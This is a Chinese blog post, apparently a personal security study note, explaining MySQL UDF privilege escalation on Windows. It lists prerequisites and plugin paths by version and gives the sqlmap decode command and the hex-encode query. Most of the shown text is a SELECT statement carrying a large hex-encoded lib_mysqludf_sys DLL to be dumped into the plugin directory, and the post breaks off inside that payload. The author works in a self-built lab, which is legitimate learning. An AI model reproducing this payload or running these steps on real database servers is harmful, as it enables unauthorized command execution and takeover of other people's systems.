aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/Windows%E6%8F%90%E6%9D%83/" itemprop="url">Windows提权</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/Windows%E6%8F%90%E6%9D%83/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>Windows提权</span></a></span></div></div><h1 class="post-title" itemprop="name headline">权限提升学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-09-25T11:17:51.329Z" title="发表于 2023-09-25 19:17:51">2023-09-25</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-08-06T14:19:53.217Z" title="更新于 2024-08-06 22:19:53">2024-08-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">9.8k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>39分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="权限提升学习"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/09/25/windows-ti-quan-xue-xi-er/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2023/09/25/windows-ti-quan-xue-xi-er/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/"><header><a class="post-meta-categories" href="/categories/Windows%E6%8F%90%E6%9D%83/" itemprop="url">Windows提权</a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" tabindex="-1" itemprop="url">Windows提权</a><h1 id="CrawlerTitle" itemprop="name headline">权限提升学习</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2023-09-25T11:17:51.329Z" title="发表于 2023-09-25 19:17:51">2023-09-25</time><time itemprop="dateCreated datePublished" datetime="2024-08-06T14:19:53.217Z" title="更新于 2024-08-06 22:19:53">2024-08-06</time></header><h1 id="0x01-前言">0x01 前言</h1>
<p>本文的来源主要是上一次刷vulnhub靶场所遗留的问题，本着哪里不懂学哪里的精神而撰写的本文，这次主要学习一下MySQL udf提权以及如何逃逸restricted shell（受限制的shell，也称lshell）。</p>
<p>最后会浅浅学习一下内网渗透时的一些常用工具的命令学习，废话不多说，直接开卷！！！</p>
<h1 id="0x02-mysql-udf-提权">0x02 MySQL-udf 提权</h1>
<h2 id="21-简介">2.1 简介</h2>
<p>UDF（user defind function）用户自定义函数，通过添加新函数，对MySQL的功能进行扩充。调用方式与一般系统自带的函数相同，例如user()，version()等函数。</p>
<p>udf 文件后缀在windows与linux系统下分别为dll与so，即动态链接库文件，由C、C++编写。</p>
<h2 id="22-利用条件">2.2 利用条件</h2>
<pre><code class="hljs plaintext">1. 将udf文件放到指定位置（Mysql&gt;5.1放在Mysql根目录的lib\plugin文件夹下）
2. 从udf文件中引入自定义函数(user defined function)
3. 执行自定义函数</code></pre>
<p><strong>mysql用户权限问题</strong></p>
<p>获得一个数据库账号，拥有对MySQL的insert和delete权限。以root为佳。</p>
<p>拥有将udf.dll写入相应目录的权限。</p>
<p><strong>数据库版本问题</strong></p>
<p>udf利用的其中一步，是要将我们的xxx.dll文件上传到mysql检索目录中，mysql各版本的检索目录有所不同：</p>
<table>
<thead>
<tr>
<th>版本</th>
<th>路径</th>
</tr>
</thead>
<tbody>
<tr>
<td>MySQL &lt; 5.0</td>
<td>导出路径随意；</td>
</tr>
<tr>
<td>5.0 &lt;= MySQL&lt; 5.1</td>
<td>需要导出至目标服务器的系统目录（如：c:/windows/system32/）</td>
</tr>
<tr>
<td>5.1 &lt; MySQL</td>
<td>必须导出到MySQL安装目录下的lib\plugin文件夹下</td>
</tr>
</tbody>
</table>
<p>一般Lib、Plugin文件夹需要手工建立（可用<strong>NTFS ADS</strong>流模式突破进而创建文件夹）不过这种方法暂未见过。</p>
<h3 id="221-常规情况">2.2.1 常规情况：</h3>
<pre><code class="hljs scss"><span class="hljs-number">1</span>. mysql配置文件secure_file_priv项设置为空，（如果为NULL或/tmp/等指定目录，即无法自定义udf文件导出位置，则无法利用）；

<span class="hljs-number">2</span>. CREATE权限、FILE权限（root用户默认拥有所有权限）。</code></pre>
<p>首先基础语法查询是否 secure_file_priv 没有限制</p>
<table>
<thead>
<tr>
<th>Value</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>NULL</td>
<td>不允许导入或导出</td>
</tr>
<tr>
<td>/tmp</td>
<td>只允许在 /tmp 目录导入导出</td>
</tr>
<tr>
<td>空</td>
<td>不限制目录</td>
</tr>
</tbody>
</table>
<blockquote>
<p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p>
<p>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p>
</blockquote>
<h3 id="222-特殊情况">2.2.2 特殊情况：</h3>
<p>INSERT权限；</p>
<p>UPDATE权限；</p>
<p>DELETE权限。</p>
<h4 id="查看当前数据库用户权限">查看当前数据库用户权限：</h4>
<p>我们进入mysql所在的bin目录下打开cmd输入账号密码登录数据库</p>
<pre><code class="hljs mysql">select * from mysql.user where user = substring_index(user(), '@', 1)\G;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925193740072.png" alt="image-20230925193740072"></p>
<p>可以看到当前用户的权限情况，Y代表有对应的权限</p>
<h2 id="23-版本特性">2.3 版本特性</h2>
<p>udf提权操作中的一个步骤是将我们的udf文件上传到mysql的检索目录中，Windows系统下mysql各版本的检索目录有所不同：</p>
<h3 id="1-mysql-lt-41">1、 Mysql &lt; 4.1</h3>
<p>在MYSQL 4.1以前的版本中，可以将所有的DLL文件里面的任何函数都注册到MYSQL里面以供MYSQL调用。无论这个DLL在什么位置，函数的声明是什么样的。</p>
<h3 id="2-mysql-lt-50">2、 Mysql &lt; 5.0</h3>
<p>导出路径随意。</p>
<h3 id="3-50-lt-mysql-lt-51">3、 5.0 &lt;= Mysql &lt; 5.1</h3>
<p>Win2000导出路径： C:/Winnt/udf.dll</p>
<p>其他Windows系统导出路径均为：C:/Windows/udf.dll或C:/Windows/system32/udf.dll</p>
<h3 id="4-mysql-gt-51">4、 Mysql &gt;= 5.1</h3>
<p>Mysql安装目录的lib\plugin文件夹下，如果mysql安装时不选择完整安装或使用集成开发环境等情况下lib\plugin目录大概率是不存在的，需要自行创建。</p>
<p>由于这里还得搭配环境，我这里选择在虚拟机上下载小皮（自带mysql）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925195617350.png" alt="image-20230925195617350"></p>
<p>搭建成功！</p>
<h2 id="24-udf文件位置">2.4 UDF文件位置</h2>
<h3 id="1-sqlmap">1、sqlmap：</h3>
<pre><code class="hljs scss">sqlmap\data\udf\mysql</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925195858624.png" alt="image-20230925195858624"></p>
<h3 id="2-metaspliot">2、metaspliot：</h3>
<pre><code class="hljs scss">/usr/share/metasploit-framework/data/exploits/mysql</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925200105640.png" alt="image-20230925200105640"></p>
<h2 id="25-操作步骤">2.5 操作步骤</h2>
<h3 id="1-查看可导出文件位置">1、查看可导出文件位置</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925200241394.png" alt="image-20230925200241394"></p>
<p>这里看到我是NULL很明显不能利用了，因此我跟着网上文章改了一下配置为空，方便接下来操作</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925201457620.png" alt="image-20230925201457620"></p>
<h3 id="2-查看当前数据库用户权限">2、查看当前数据库用户权限</h3>
<pre><code class="hljs scss">select * from mysql<span class="hljs-selector-class">.user</span> where user = <span class="hljs-built_in">substring_index</span>(user(), '@<span class="hljs-string">', 1)\G;</span></code></pre>
<p>可以看到有几个关键的权限</p>
<pre><code class="hljs scss">Select_priv: Y
Insert_priv: Y
Update_priv: Y
Delete_priv: Y</code></pre>
<h3 id="3-确认mysql安装位置">3、确认mysql安装位置</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925201646050.png" alt="image-20230925201646050"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925201736284.png" alt="image-20230925201736284"></p>
<h3 id="4-通过主机版本及架构确认mysql位数来选用udf文件">4、通过主机版本及架构确认mysql位数来选用udf文件</h3>
<p>此处显示为Windows 64位操作系统</p>
<pre><code class="hljs scss">show variables like '%compile%';</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925201847107.png" alt="image-20230925201847107"></p>
<h3 id="5-查看数据库版本判断udf文件写入位置">5、查看数据库版本，判断udf文件写入位置</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925201939661.png" alt="image-20230925201939661"></p>
<h4 id="51-mysql大于51版本时">5.1 mysql大于5.1版本时</h4>
<p><strong>查看 plugin 目录，存在lib\plugin目录且有webshell时，直接上传udf文件。</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925202112099.png" alt="image-20230925202112099"></p>
<p><strong>查看 plugin 目录，存在lib\plugin目录但没有webshell时，则需要以16进制编码写入udf文件。</strong></p>
<p>很明显我们这里的情况是后者</p>
<h5 id="512-sqlmap-udf文件解码">5.1.2 sqlmap udf文件解码</h5>
<p>​		首先将对应版本的udf文件进行16进制编码（sqlmap中的udf文件为防止误杀默认是经过异或编码的，需先使用sqlmap自带的脚本解码）。</p>
<pre><code class="hljs scss">python3 extra/cloak/cloak<span class="hljs-selector-class">.py</span> -d -<span class="hljs-selector-tag">i</span> data/udf/mysql/windows/<span class="hljs-number">64</span>/lib_mysqludf_sys<span class="hljs-selector-class">.dll_</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925202546055.png" alt="image-20230925202546055"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925202705267.png" alt="image-20230925202705267"></p>
<h5 id="513-16进制编码udf文件">5.1.3 16进制编码udf文件</h5>
<pre><code class="hljs scss">select <span class="hljs-built_in">hex</span>(load_file('C:\\lib_mysqludf_sys.dll')) into dumpfile 'C:\\lib_mysqludf_sys.txt<span class="hljs-string">';</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925203656117.png" alt="image-20230925203656117"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230925203714767.png" alt="image-20230925203714767"></p>
<h5 id="514-udf写入plugin目录">5.1.4 udf写入plugin目录</h5>
<p>将16进制编码后udf文件使用dumpfile函数写入磁盘（outfile导出文件会在末尾写入新行且转义换行符，破坏二进制文件结构，dumpfile不会进行任何操作）。</p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000677CBFDA231DD189231DD189231DD18904DBBF89211DD18904DBBC892A1DD18904DBAA89261DD189231DD0890F1DD18904DBAC89211DD18904DBA089221DD18904DBAB89221DD18904DBA989221DD18952696368231DD189000000000000000000000000000000005045000064860300A727A15A0000000000000000F00022200B020800002000000010000000800000109F000000900000000000100000000000100000000200000400000000000000050002000000000000C000000010000000000000020000000000100000000000001000000000000000001000000000000010000000000000000000001000000098B2000008020000B0B10000E800000000B00000B00100000050000050010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000800000001000000000000000040000000000000000000000000000800000E0555058310000000000200000009000000012000000040000000000000000000000000000400000E02E727372630000000010000000B000000006000000160000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E393100555058210D240209E1E421439D3BDFB7DE7400000F0F0000002A0000490000D41DE9FEFF833A007450488B05A421000049890009A24008CD4973D20A9F109C1899CD9F34272096280FB70593666D83FDB7410B30B001C332C0C3CC00C215CC92C9BA810034716A6FEBCC16E46C096A471853FDBF1FA4631C0FB605591688401E41C7011E00FFED6DD62B8B63BF01750F3F42088338007506C64B26EBDC01017B4E2D632B05B9E4B228CE25227ED20CD26F1F28152AB001C3F66D7BC2BF83EC38344A43895C243084B7FFF6DBD90B09FF15C71F2B4885C04C8BD87512104C24DF6EAEB9608707202DC4388E897C242873EDCDFD33C048C7C1FF0033FBF2AE1C120976D9B75B1AF7D122E901890B2DCC00BE6FEB166F28E3026E404848DEDA7FDB29F938D87459488D0D40EE4E0E813832983DE4C1EB81403281480A9EE4435E4F81503281543281563261F37D4FB0018C48804028C34C49467607744E61DEED584917E49260680A703C6527CD18782056C740045CF8BF33B64342188B48048B008D4C010239BD1E77D27D8BD947107543706D8045EC1BE936130309884370900A00B69DEE10C8980A18BC0CB3C6B00E07103FBCB37DDB0F49A585C974066F5D17B7086D21CF93CF047424ADA3B9772D7110448B6949E2FA02C2EDDFBA52E2CE0212498D5C3001E83F0FFCE85CD7FDDD5FEBCB418B03C60430D2470D5734B70C58D7E22D0822D34313167BB75BCE2618007CA01CFF56677C84842F7198F4CF16C64373870D087C8C03D6E4240F79561E541E511E7292939C4E1E4B1E481E63C2425E3E1E1FCF2784EE87C71F1DA0981F4C89C68685EE44241824580F6C59897486BB86DB76381764BDB900D34C18284CB0DB7E302D4D8BF146E8E7B901EE9B6DC1EC04E00DDA4533ED4488670BEEF69B4FF04C39290F8413050673F215FDCFB8B9169125AC1C088BE8747B418D5508E1C9B6B13AC0E6CC177C7466A04B6640FA50669047FC3F42858E1B0B9529328D7936CE6F7D61C16C304375CD8CC74803C8F56636B724D470143E51C5BA08E1D9B68D39CC1CEB13225975AD886CDBB6F050EB258BC77004CD1930DDFE9CDB803E30E2154874229245FFB176D8827811FEF5887EDD4D174EBE5A0EEBC18424805EC606E71ADA0001380C4C38F12A10F8386C04C6F0A0581A87E792317FD3DC5CD8D6D09D58747A28F2023F73B773DF3E448D48406E41B80010B3748BD1F10DF7C7ED33C9AB441A5356104CEFA2DBE6B66C02C8D8154E1B8D54B94C350AEDE98D054A75890BA3B16E3B2DBC3133D2C7D0208925183BDF19B7B3BAD2C80DF2199D30AC581E29EB081433C0922FB384F13BE0064CEB0033C029001BB0DFB65538EC024510FF10C9196600FB6F7F6C900390483B0D89293F751148C1C11066F7DDDD6FDFB87502F3DAC1C910E9150AECCC405361203B8B7D1B5801A05FDCD25B0BFBEEF7F685DBC905112FD005020675098D430185BB76EFB6205B42C703D59B0D3C48B406634136670B1C5805B12006615BD85BC3CF55D27F6CC7C7C376FC608468E140DCFBF1C2C63831E83BE141BDD20F8503EE46BB7408075EE428073C0F8E0D8DE6B61B6E2BC58ED3105FDCFD3E76FB0FB12D602E0A741EF290B9E803C91D19BFDB36931D4275E841320783F802740FB9EF6DC3B31FB70ECA0208E2ED0D2F2E338E740FD2111912F874491412FC18DADC0B1FD958F847DF72165F1803B6BB2D701E4AD0C9EB081573ED12ECF6BEDBCF2774192D06429BD72D0698FBFB66D833DB891DB80E871DB906716FC7FEB59806E5413BD5DDE26541042530BB7DBBBD002C0978081E8BF3F048B93D883072B0B7920A63C7741AD64618D7D29B2F1C6B75E3EB037BF5A79A5ED6390C950CDAEB3FEA1F9F7DB7F08E8F080644892D312D1BC485C0678FED62771A15E5DE0DD6181ABE7FDDBBEEC7050725024585F67507B404BB833D14DDC96E73068B212A0B2D5C6F11DEDD264FE3029CF12C66012D3A273E9E9EBE10C58F38D240E468EC98717A60DCE91748C3B14D22190F6C20483A5ADBF308505851F0DD05BBEE77DF3D041F208915D12695D275133915D709ED7F38C3750B5A17C61E83FA017405040ADD6BE00275338931D39D08A3B71B0D34C84E20C574134AC68B07863DB9D7A64BFC1616E0C9016B3C1A0EDC83FFB092EBDA1535AB311BC11BDB5B0BD80C430C1DC817084D7BF787755C0B1841FFD385FF88FF03753970F79D75094A08AEEB8D1CA51E36EC648B171028ADEB06D8192ECC298ADC25F3008BC3659E8793708B218B8BF8B59D9E2A4055BF15EAA3894D7AFAB61B01018B080724B0D67D5D902DD9C2302F5E7D0AB1485825FF4DDB960C1E92387D2EDA02F101D7136FA3F875056C0CFCFA7D918844A4FD258B036983EB2F9E8E090CEFC6F852A1899E2681EC880068CD760DBFFE73153F156705B8C648F25845B7390CB8283D1F2C586170C339DEF61624EB754148B73DC6364238004044230430090E662FCF40280578254703055C73874C1C51494E7D4BB1077F4BF0EB222B8093447BDD837D738D0E83C00812D13E8D67DB7B642A059B240D20902F9C5BA25B701C2A7214097BC009CC3E1E666C926724766E833572DBFF0B70DC7A142F482C38B0BB2493827B8EF083D2396A14019B15650CCB36DC9255B624C80A271B83D76C1854BA6A234E336B1784F781C4AC